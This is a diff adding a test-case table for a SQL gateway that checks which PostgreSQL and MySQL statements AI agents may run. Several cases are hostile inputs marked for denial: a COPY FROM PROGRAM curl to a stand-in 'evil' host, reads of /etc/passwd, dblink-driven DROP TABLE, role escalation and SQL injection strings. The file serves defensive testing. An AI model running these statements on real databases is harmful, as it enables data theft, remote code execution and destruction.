@@ -1,0 +1,290 @@
+# Routes of report 04 §3.5 and §6.1: dialect | tool | env | SQL | expected | options
+# expected: READ, MUTATION or DENY <rule> (the rule id is <env>.sql.<rule>)
+# options: allowlist=a,b (policy) · denied=f (policy deniedFunctions) · ddl=deny|allow (policy denyDdl)
+#          allowed=f,s.g (connection allowedFunctions) · schemas=a,b (connection schemaAllowlist) · nodb (MySQL)
+#
+# ── PostgreSQL, sql_query: reads ──────────────────────────────────────────────────────────────────────────
+pg | query | dev | SELECT 1 | READ
+pg | query | dev | select id, status from orders where status = 'paid' order by id limit 10 | READ
+pg | query | dev | WITH recent AS (SELECT * FROM orders WHERE created_at > now() - interval '1 day') SELECT count(*) FROM recent | READ
+pg | query | dev | VALUES (1, 'a'), (2, 'b') | READ
+pg | query | dev | TABLE orders | READ
+pg | query | dev | EXPLAIN SELECT * FROM orders | READ
+pg | query | dev | EXPLAIN ANALYZE SELECT * FROM orders | READ
+pg | query | dev | EXPLAIN DELETE FROM orders | READ
+pg | query | dev | SELECT o.id, c.email FROM orders o JOIN customers c ON c.id = o.customer_id | READ
+pg | query | dev | SELECT * FROM orders WHERE id IN (SELECT order_id FROM order_items WHERE qty > 2) | READ
+pg | query | dev | SELECT status, count(*) FROM orders GROUP BY status HAVING count(*) > 1 | READ
+pg | query | dev | SELECT id, row_number() OVER (PARTITION BY status ORDER BY id) FROM orders | READ
+pg | query | dev | SELECT coalesce(note, '') || ' ' || upper(status) FROM orders | READ
+pg | query | dev | SELECT $$a;b$$ AS text | READ
+# JSqlParser 5.4 reads $$…$$ but not every tagged dollar quote: fail closed.
+pg | query | dev | SELECT $tag$ DROP TABLE orders; $tag$ AS text | DENY unparsed
+pg | query | dev | SELECT 'a;b' AS x; | READ
+pg | query | dev | SELECT /* ; DROP TABLE orders; */ 1 | READ
+pg | query | dev | SELECT /* nested /* ; */ still a comment */ 1 | READ
+pg | query | dev | SELECT 1 -- ; DROP TABLE orders | READ
+pg | query | dev | SELECT jsonb_build_object('id', id) FROM orders | READ
+pg | query | dev | SELECT pg_catalog.now() | READ
+pg | query | dev | SELECT now()::date | READ
+pg | query | dev | SELECT * FROM generate_series(1, 10) | READ
+pg | query | dev | SELECT nextval('orders_id_seq') | READ
+pg | query | dev | SELECT pg_sleep(10) | READ
+pg | query | dev | SELECT count(*) FILTER (WHERE status = 'paid') FROM orders | READ
+pg | query | dev | SELECT CASE WHEN total > 100 THEN 'big' ELSE 'small' END FROM orders | READ
+pg | query | dev | SELECT * FROM orders ORDER BY id DESC LIMIT 5 OFFSET 10 | READ
+pg | query | dev | SHOW search_path | READ
+pg | query | dev | SELECT * FROM pg_stat_activity | READ
+pg | query | dev | SELECT * FROM orders; -- trailing comment | READ
+pg | query | dev | SELECT * FROM оrders | READ
+pg | query | prod | SELECT id, status FROM orders | READ
+pg | query | stage | SELECT id, status FROM orders | READ
+#
+# ── PostgreSQL, sql_query: what isn't a read ──────────────────────────────────────────────────────────────
+pg | query | dev | SELECT * FROM orders FOR UPDATE | DENY query-writes
+pg | query | dev | SELECT * FROM orders FOR SHARE | DENY query-writes
+pg | query | dev | SELECT * FROM (SELECT * FROM orders FOR UPDATE) t | DENY query-writes
+pg | query | dev | WITH d AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM d | DENY query-writes
+pg | query | dev | WITH u AS (UPDATE orders SET status = 'x' RETURNING id) SELECT count(*) FROM u | DENY query-writes
+pg | query | dev | WITH i AS (INSERT INTO orders (id) VALUES (1) RETURNING id) SELECT * FROM i | DENY query-writes
+pg | query | dev | SELECT * INTO new_orders FROM orders | DENY query-writes
+pg | query | dev | UPDATE orders SET status = 'x' | DENY query-writes
+pg | query | dev | DELETE FROM orders | DENY query-writes
+pg | query | dev | INSERT INTO orders (id) VALUES (1) | DENY query-writes
+pg | query | dev | CREATE TABLE t (id int) | DENY query-writes
+pg | query | dev | DROP TABLE orders | DENY query-writes
+pg | query | dev | TRUNCATE orders | DENY query-writes
+pg | query | dev | CALL p_write() | DENY query-writes
+pg | query | dev | EXPLAIN ANALYZE DELETE FROM orders | DENY query-writes
+pg | query | dev | EXPLAIN ANALYZE UPDATE orders SET status = 'x' | DENY query-writes
+# EXPLAIN ANALYZE runs the statement, so functions inside it are seen (review 2026-10-26): the parser recurses into it.
+pg | query | dev | EXPLAIN ANALYZE SELECT dblink_exec('x', 'DROP TABLE orders') | DENY function-denied
+pg | query | dev | EXPLAIN ANALYZE SELECT my_wrapper() | MUTATION
+pg | query | prod | EXPLAIN ANALYZE SELECT my_wrapper() | DENY function-not-built-in
+pg | query | dev | SELECT 1; SELECT 2 | DENY multi-statement
+pg | query | dev | SELECT 1; DROP TABLE orders | DENY multi-statement
+#
+# ── PostgreSQL: transaction and session control, refused for every tool ───────────────────────────────────
+pg | query | dev | BEGIN | DENY forbidden
+pg | query | dev | COMMIT | DENY forbidden
+pg | query | dev | ROLLBACK | DENY forbidden
+pg | query | dev | SET statement_timeout = 0 | DENY forbidden
+pg | query | dev | SET LOCAL statement_timeout = 0 | DENY forbidden
+pg | query | dev | RESET ALL | DENY forbidden
+pg | query | dev | COPY orders TO '/tmp/orders.csv' | DENY forbidden
+pg | query | dev | COPY orders FROM PROGRAM 'curl http://evil/x' | DENY forbidden
+pg | execute | dev | COPY orders FROM PROGRAM 'curl http://evil/x' | DENY forbidden
+pg | query | dev | DO $$ BEGIN PERFORM 1; END $$ | DENY unparsed
+pg | execute | dev | DO $$ BEGIN PERFORM pg_sleep(1); END $$ | MUTATION
+pg | execute | prod | DO $$ BEGIN PERFORM 1; END $$ | DENY unparsed | ddl=deny
+pg | query | dev | LISTEN orders_changed | DENY forbidden
+pg | query | dev | NOTIFY orders_changed | DENY forbidden
+pg | query | dev | VACUUM orders | DENY forbidden
+pg | query | dev | PREPARE p AS SELECT 1 | DENY forbidden
+pg | query | dev | EXECUTE p | DENY forbidden
+pg | query | dev | LOCK TABLE orders IN ACCESS EXCLUSIVE MODE | DENY forbidden
+pg | execute | dev | BEGIN; UPDATE orders SET status = 'x'; COMMIT | DENY forbidden
+pg | execute | dev | SAVEPOINT a | DENY forbidden
+pg | execute | dev | ROLLBACK | DENY forbidden
+pg | execute | dev | COPY orders FROM '/tmp/orders.csv' | DENY forbidden
+pg | execute | dev | CREATE DATABASE other | DENY forbidden
+pg | execute | dev | DROP DATABASE app | DENY forbidden
+pg | execute | dev | ALTER SYSTEM SET work_mem = '1GB' | DENY forbidden
+pg | execute | dev | SET ROLE postgres | DENY forbidden
+pg | execute | dev | SET SESSION AUTHORIZATION postgres | DENY forbidden
+pg | execute | dev | DISCARD ALL | DENY forbidden
+pg | execute | dev | CHECKPOINT | DENY forbidden
+pg | execute | dev | UPDATE orders SET status = 'x'; COMMIT | DENY forbidden
+#
+# ── PostgreSQL: functions ─────────────────────────────────────────────────────────────────────────────────
+pg | query | dev | SELECT set_config('statement_timeout', '0', false) | DENY function-denied
+pg | query | dev | SELECT pg_terminate_backend(123) | DENY function-denied
+pg | query | dev | SELECT pg_cancel_backend(123) | DENY function-denied
+pg | query | dev | SELECT pg_advisory_lock(1) | DENY function-denied
+pg | query | dev | SELECT pg_try_advisory_xact_lock(1) | DENY function-denied
+pg | query | dev | SELECT pg_read_file('/etc/passwd') | DENY function-denied
+pg | query | dev | SELECT pg_ls_dir('.') | DENY function-denied
+pg | query | dev | SELECT lo_import('/etc/passwd') | DENY function-denied
+pg | query | dev | SELECT dblink_exec('dbname=app', 'DELETE FROM orders') | DENY function-denied
+pg | query | dev | SELECT dblink('dbname=app', 'SELECT 1') | DENY function-denied
+pg | query | dev | SELECT query_to_xml('SELECT * FROM secrets', true, false, '') | DENY function-denied
+pg | query | dev | SELECT pg_notify('orders', 'x') | DENY function-denied
+pg | query | dev | SELECT brin_summarize_new_values('orders_brin') | DENY function-denied
+pg | query | dev | SELECT gin_clean_pending_list('orders_gin') | DENY function-denied
+pg | query | dev | SELECT PG_TERMINATE_BACKEND(1) | DENY function-denied
+pg | query | dev | SELECT pg_catalog.pg_terminate_backend(1) | DENY function-denied
+pg | query | dev | SELECT "pg_terminate_backend"(1) | DENY function-denied
+pg | query | dev | SELECT * FROM orders WHERE pg_terminate_backend(1) | DENY function-denied
+pg | query | dev | SELECT (SELECT pg_advisory_lock(1)) | DENY function-denied
+pg | query | dev | SELECT md5(email) FROM customers | DENY function-denied | denied=md5
+pg | execute | dev | UPDATE orders SET note = pg_terminate_backend(1)::text | DENY function-denied
+pg | query | dev | SELECT my_wrapper() | MUTATION
+pg | query | stage | SELECT my_wrapper() | MUTATION
+pg | query | prod | SELECT my_wrapper() | DENY function-not-built-in
+pg | query | dev | SELECT public.f_write() | MUTATION
+pg | query | dev | SELECT f_read() | READ | allowed=f_read
+pg | query | prod | SELECT f_read() | READ | allowed=f_read
+pg | query | dev | SELECT public.f_read() | MUTATION | allowed=f_read
+pg | query | dev | SELECT public.f_read() | READ | allowed=public.f_read
+pg | query | dev | SELECT "NOW"() | MUTATION
+pg | query | dev | SELECT myschema.now() | MUTATION
+pg | query | dev | SELECT * FROM orders WHERE id = f_lookup(1) | MUTATION
+pg | query | dev | SELECT (SELECT f_write()) | MUTATION
+pg | query | dev | SELECT * FROM f_rows() | MUTATION
+pg | query | prod | SELECT * FROM f_rows() | DENY function-not-built-in
+pg | execute | dev | UPDATE orders SET note = f_write() | MUTATION
+pg | execute | prod | UPDATE orders SET note = f_write() WHERE id = 1 | MUTATION
+#
+# ── PostgreSQL: what the gateway can't analyze ────────────────────────────────────────────────────────────
+pg | query | dev | SELECT E'\'' | DENY unparsed
+pg | query | dev | DO $$ BEGIN DELETE FROM orders; END $$ | DENY unparsed
+pg | execute | dev | DO $$ BEGIN DELETE FROM orders; END $$ | MUTATION
+pg | execute | stage | DO $$ BEGIN DELETE FROM orders; END $$ | DENY unparsed
+pg | execute | prod | DO $$ BEGIN DELETE FROM orders; END $$ | DENY unparsed
+pg | execute | dev | DO $$ BEGIN DELETE FROM orders; END $$ | DENY unparsed | allowlist=public.*
+pg | query | dev | SELECT 'unclosed | DENY unparsed
+#
+# ── PostgreSQL, sql_execute ───────────────────────────────────────────────────────────────────────────────
+pg | execute | dev | UPDATE orders SET status = 'cancelled' WHERE id = 48213 | MUTATION
+pg | execute | dev | INSERT INTO orders (id, status) VALUES (1, 'new') | MUTATION
+pg | execute | dev | DELETE FROM orders WHERE id = 1 | MUTATION
+pg | execute | dev | UPDATE orders SET status = 'x' WHERE id = 1 RETURNING id, status | MUTATION
+pg | execute | dev | INSERT INTO orders (id) VALUES (1) ON CONFLICT (id) DO NOTHING | MUTATION
+pg | execute | dev | UPDATE orders SET status = 'x' WHERE id = 1; DELETE FROM order_items WHERE order_id = 1 | MUTATION
+pg | execute | dev | WITH d AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM d | MUTATION
+pg | execute | dev | SELECT * FROM orders FOR UPDATE | MUTATION
+pg | execute | dev | EXPLAIN ANALYZE DELETE FROM orders | MUTATION
+pg | execute | dev | CALL p_write() | MUTATION
+pg | execute | dev | UPDATE orders SET note = pg_sleep(0)::text | MUTATION
+pg | execute | prod | UPDATE orders SET status = 'x' WHERE id = 1 | MUTATION
+pg | execute | dev | SELECT 1 | DENY execute-read
+pg | execute | dev | SELECT * FROM orders; SELECT 2 | DENY execute-read
+pg | execute | dev | CREATE TABLE t (id int) | MUTATION
+pg | execute | dev | GRANT SELECT ON orders TO bob | MUTATION
+pg | execute | dev | CREATE TABLE t (id int) | DENY block_ddl | ddl=deny
+pg | execute | stage | CREATE TABLE t (id int) | DENY block_ddl
+pg | execute | stage | CREATE TABLE t (id int) | MUTATION | ddl=allow
+pg | execute | prod | DROP TABLE orders | DENY block_ddl
+pg | execute | prod | TRUNCATE orders | DENY block_ddl
+pg | execute | prod | ALTER TABLE orders ADD COLUMN x int | DENY block_ddl
+pg | execute | prod | CREATE INDEX i ON orders (status) | DENY block_ddl
+pg | execute | prod | GRANT SELECT ON orders TO bob | DENY block_ddl
+pg | execute | prod | UPDATE orders SET status = 'x'; DROP TABLE orders | DENY block_ddl
+pg | execute | prod | SELECT * INTO copy_of_orders FROM orders | DENY block_ddl
+# Temporary objects and cursors that outlive the transaction stay in the pooled session: never run.
+pg | execute | dev | CREATE TEMP TABLE orders (id int) | DENY forbidden
+pg | execute | dev | CREATE TEMPORARY TABLE t AS SELECT * FROM orders | DENY forbidden
+pg | execute | dev | CREATE GLOBAL TEMPORARY TABLE t (id int) | DENY forbidden
+pg | execute | dev | /* note */ CREATE OR REPLACE TEMP VIEW orders AS SELECT 1 AS id | DENY forbidden
+pg | execute | dev | CREATE TEMP SEQUENCE s | DENY forbidden
+pg | execute | dev | SELECT * INTO TEMP t FROM orders | DENY forbidden
+pg | execute | dev | SELECT * INTO TEMPORARY TABLE t FROM orders | DENY forbidden
+pg | execute | dev | UPDATE orders SET a = 1; CREATE TEMP TABLE t (id int) | DENY forbidden
+pg | execute | dev | DECLARE c CURSOR WITH HOLD FOR SELECT * FROM orders | DENY forbidden
+pg | execute | dev | CREATE TABLE temp (id int) | MUTATION
+pg | execute | dev | INSERT INTO temp VALUES (1) | MUTATION
+pg | execute | dev | WITH x AS (SELECT 1 AS id) INSERT INTO temp SELECT id FROM x | MUTATION
+pg | execute | dev | CREATE UNLOGGED TABLE t (id int) | MUTATION
+pg | query | dev | SELECT 'CREATE TEMP TABLE t' AS s | READ
+#
+# ── Tables agents may use ─────────────────────────────────────────────────────────────────────────────────
+pg | query | dev | SELECT * FROM orders | READ | allowlist=public.orders
+pg | query | dev | SELECT * FROM ORDERS | READ | allowlist=public.orders
+pg | query | dev | SELECT * FROM public.orders | READ | allowlist=public.orders
+pg | query | dev | SELECT * FROM app.public.orders | READ | allowlist=public.orders
+pg | query | dev | SELECT * FROM "Orders" | DENY table-not-allowed | allowlist=public.orders
+pg | query | dev | SELECT * FROM оrders | DENY table-not-allowed | allowlist=public.orders
+pg | query | dev | SELECT * FROM orders JOIN secrets ON true | DENY table-not-allowed | allowlist=public.orders
+pg | query | dev | SELECT * FROM orders WHERE id IN (SELECT id FROM secrets) | DENY table-not-allowed | allowlist=public.orders
+pg | query | dev | WITH x AS (SELECT * FROM orders) SELECT * FROM x | READ | allowlist=public.orders
+pg | query | dev | SELECT 1 | READ | allowlist=public.orders
+pg | query | dev | SELECT * FROM billing.invoices | DENY table-not-allowed | allowlist=public.*
+pg | query | dev | SELECT * FROM billing.invoices | READ | allowlist=billing.*
+pg | query | dev | SELECT * FROM billing.invoices | READ | allowlist=billing
+pg | query | dev | SELECT * FROM pg_catalog.pg_authid | DENY table-not-allowed | allowlist=public.*
+pg | query | dev | SELECT * FROM pg_user | DENY table-not-allowed | allowlist=public.*
+pg | query | dev | SELECT * FROM pg_user | DENY table-not-allowed | allowlist=*
+pg | query | dev | SELECT * FROM information_schema.tables | DENY table-not-allowed | allowlist=public.*
+pg | query | dev | SELECT * FROM information_schema.tables | READ | allowlist=information_schema.*
+pg | query | dev | SELECT * FROM billing.invoices | DENY table-not-allowed | schemas=public
+pg | query | dev | SELECT * FROM public.orders | READ | schemas=public
+pg | query | dev | SELECT * FROM public.orders | DENY table-not-allowed | allowlist=public.orders;schemas=billing
+pg | execute | dev | UPDATE orders SET status = 'x' WHERE id = 1 | MUTATION | allowlist=public.orders
+pg | execute | dev | UPDATE secrets SET a = 1 | DENY table-not-allowed | allowlist=public.orders
+pg | execute | dev | INSERT INTO orders SELECT * FROM secrets | DENY table-not-allowed | allowlist=public.orders
+pg | execute | dev | CALL p_write() | DENY table-not-allowed | allowlist=public.orders
+#
+# ── MySQL and MariaDB ─────────────────────────────────────────────────────────────────────────────────────
+my | query | dev | SELECT 1 | READ
+my | query | dev | SELECT * FROM `orders` WHERE status = 'paid' | READ
+my | query | dev | SELECT 'it\'s' AS s | READ
+my | query | dev | SELECT 'a\';DROP TABLE orders;--' AS s | READ
+my | query | dev | SELECT "a;b" AS s | READ
+# JSqlParser doesn't read MySQL's # comments: fail closed.
+my | query | dev | SELECT 1 # ; DROP TABLE orders | DENY unparsed
+my | query | dev | SELECT 1 -- ; DROP TABLE orders | READ
+my | query | dev | SELECT 1 FROM DUAL | READ
+my | query | dev | SELECT SLEEP(1) | READ
+my | query | dev | SELECT JSON_OBJECT('id', id) FROM orders | READ
+my | query | dev | SHOW TABLES | READ
+my | query | dev | DESCRIBE orders | READ
+my | query | dev | EXPLAIN SELECT * FROM orders | READ
+my | query | dev | /*! DROP TABLE orders */ SELECT 1 | DENY unparsed
+my | query | dev | SELECT 1 /*!50000 , SLEEP(10) */ | DENY unparsed
+my | query | dev | SELECT /*+ SET_VAR(max_execution_time = 0) */ SLEEP(60) | DENY unparsed
+pg | query | dev | /*+ Set(statement_timeout 0) */ SELECT pg_sleep(60) | DENY unparsed
+my | query | dev | SHOW CREATE TABLE orders | DENY unparsed
+my | query | dev | SELECT @a := 5 | DENY forbidden
+my | query | dev | SELECT @a := @a + 1 FROM orders | DENY forbidden
+my | query | dev | SELECT id INTO @v FROM orders | DENY forbidden
+my | execute | dev | SELECT id INTO @v FROM orders | DENY forbidden
+my | execute | dev | UPDATE orders SET n = (@a := @a + 1) | DENY forbidden
+my | query | dev | SELECT ':=' AS s, 'INTO @v' AS t | READ
+# Reading a user variable leaves nothing behind.
+my | query | dev | SELECT * FROM orders WHERE note = @a | READ
+my | execute | dev | CREATE TEMPORARY TABLE t (id int) | DENY forbidden
+my | execute | dev | CREATE TEMPORARY TABLE t SELECT * FROM orders | DENY forbidden
+my | query | dev | SELECT @@version | READ
+my | query | dev | SELECT * FROM orders INTO OUTFILE '/tmp/orders.csv' | DENY forbidden
+my | query | dev | SELECT * FROM orders INTO DUMPFILE '/tmp/orders.bin' | DENY forbidden
+my | query | dev | SELECT * FROM orders FOR UPDATE | DENY query-writes
+my | query | dev | SELECT GET_LOCK('a', 10) | DENY function-denied
+my | query | dev | SELECT get_lock('a', 10) | DENY function-denied
+my | query | dev | SELECT LOAD_FILE('/etc/passwd') | DENY function-denied
+my | query | dev | SELECT BENCHMARK(1000000, MD5('a')) | DENY function-denied
+my | query | dev | SELECT RELEASE_ALL_LOCKS() | DENY function-denied
+my | query | dev | SELECT app.f_write() | MUTATION
+my | query | dev | SELECT f_write() | MUTATION
+my | query | prod | SELECT f_write() | DENY function-not-built-in
+my | query | dev | SELECT f_read() | READ | allowed=f_read
+my | query | dev | SELECT 1; SELECT 2 | DENY multi-statement
+my | query | dev | UPDATE orders SET status = 'x' | DENY query-writes
+my | execute | dev | UPDATE orders SET status = 'x' WHERE id = 1 | MUTATION
+my | execute | dev | INSERT INTO orders (id, status) VALUES (1, 'new') | MUTATION
+my | execute | dev | REPLACE INTO orders (id) VALUES (1) | MUTATION
+my | execute | dev | DELETE FROM orders WHERE id = 1 | MUTATION
+my | execute | dev | UPDATE orders SET a = 1; UPDATE order_items SET b = 2 | DENY multi-statement
+my | execute | dev | CREATE TABLE t (id int) | MUTATION
+my | execute | prod | DROP TABLE orders | DENY block_ddl
+my | execute | stage | ALTER TABLE orders ADD COLUMN x int | DENY block_ddl
+my | execute | dev | SET @a = 1 | DENY forbidden
+my | execute | dev | SET SESSION sql_mode = 'ANSI_QUOTES' | DENY forbidden
+my | execute | dev | USE other | DENY forbidden
+my | execute | dev | LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t | DENY forbidden
+my | execute | dev | HANDLER orders OPEN | DENY forbidden
+my | execute | dev | KILL 12 | DENY forbidden
+my | execute | dev | LOCK TABLES orders WRITE | DENY forbidden
+my | execute | dev | START TRANSACTION | DENY forbidden
+my | execute | dev | SELECT 1 | DENY execute-read
+my | query | dev | SELECT * FROM mysql.user | READ
+my | query | dev | SELECT * FROM mysql.user | DENY table-not-allowed | allowlist=app.*
+my | query | dev | SELECT * FROM mysql.user | DENY table-not-allowed | allowlist=*
+my | query | dev | SELECT * FROM app.orders | READ | allowlist=app.orders
+my | query | dev | SELECT * FROM orders | READ | allowlist=app.orders
+my | query | dev | SELECT `orders`.id FROM `orders` | READ | allowlist=app.orders
+my | query | dev | SELECT * FROM ORDERS | DENY table-not-allowed | allowlist=app.orders
+my | query | dev | SELECT * FROM other.orders | DENY table-not-allowed | allowlist=app.orders
+my | query | dev | SELECT 1 FROM DUAL | READ | allowlist=app.orders
+my | query | dev | SELECT * FROM orders | DENY table-not-allowed | allowlist=app.orders;nodb
+my | query | dev | SELECT * FROM app.orders | READ | allowlist=app.orders;nodb
+my | execute | dev | UPDATE secrets SET a = 1 | DENY table-not-allowed | allowlist=app.orders
